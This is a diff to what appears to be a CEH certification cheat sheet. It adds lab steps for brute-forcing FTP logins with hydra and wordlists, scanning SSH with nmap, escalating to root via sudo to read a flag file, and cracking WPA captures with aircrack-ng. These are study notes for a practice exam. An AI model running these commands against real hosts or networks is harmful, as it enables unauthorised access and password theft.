@@ -67,8 +67,14 @@ Thief RAT -> File Manager -> Open folder -> Count files
 				      ftp 10.10.10.10 (To see if it is directly connecting or needing credentials)
 Then go to Desktop and in Ceh tools folder you will find wordlists, here you will find usernames and passwords file.
 Now in terminal type-  hydra -L /home/attacker/Desktop/CEH_TOOLS/Wordlists/Username.txt -P /home/attacker/Desktop/CEH_TOOLS/Wordlists/Password.txt ftp://10.10.10.10
-
-hydra -l user -P passlist.txt ftp://10.10.10.10
+4- hydra -l user -P passlist.txt ftp://10.10.10.10
+5- nmap -sV -p 22 <IP/24>  for privilage esclation
+   ssh marcus@<IP>
+   Sudo -l
+   sudo -i
+   cd /
+   find . -name imroot.txt
+   cat givenpath/imroot.txt
 ```
 #  Hacking Web Application
 ```
@@ -166,6 +172,7 @@ aircrack-ng -a2 -b [Target BSSID] -w [password_Wordlist.txt] [WP2 PCAP file] (Fo
 airodump-ng W!F!_Pcap.cap
 airodump-ng --bssid BSSID --channel CHANNEL -w outputfile W!F!_Pcap.cap
 aircrack-ng -w /path/to/wordlist.txt outputfile-01.cap
+aircrack-ng -b <bssid from wireshark> -w <path to word list> <pathto pcap file>
 
 ```
 #  Some extra work 
